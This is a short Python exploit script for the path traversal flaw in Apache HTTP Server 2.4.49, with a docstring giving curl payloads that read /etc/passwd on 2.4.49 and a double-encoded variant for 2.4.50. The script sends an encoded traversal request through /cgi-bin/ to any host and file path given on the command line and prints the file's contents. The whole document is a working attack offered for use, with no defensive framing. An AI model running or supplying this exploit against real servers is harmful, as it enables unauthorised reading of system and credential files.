#!/usr/bin/env python3
import sys
import requests
"""
[+] Exploit Title: Apache HTTP Server 2.4.49 Path Traversal
[+] Payload without cgi-bin:  curl -v 'http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
[+] Payload apache 2.4.50: .%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
"""

def main():
    if sys.argv[1] == '-h':
        h = '''
        Example: python3 exploit-cve2021.py myapachevuln /file
        '''
        print(h)

    else:
        try:
            target = sys.argv[1]  # target url
            file = sys.argv[2]    # file to request

            payload = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e'
            response = requests.get(f'http://{target}{payload}{file}')

            print(response.text)

        except:
            print('Something went wrong with the args.')
            exit()


if __name__ == '__main__':
    main()
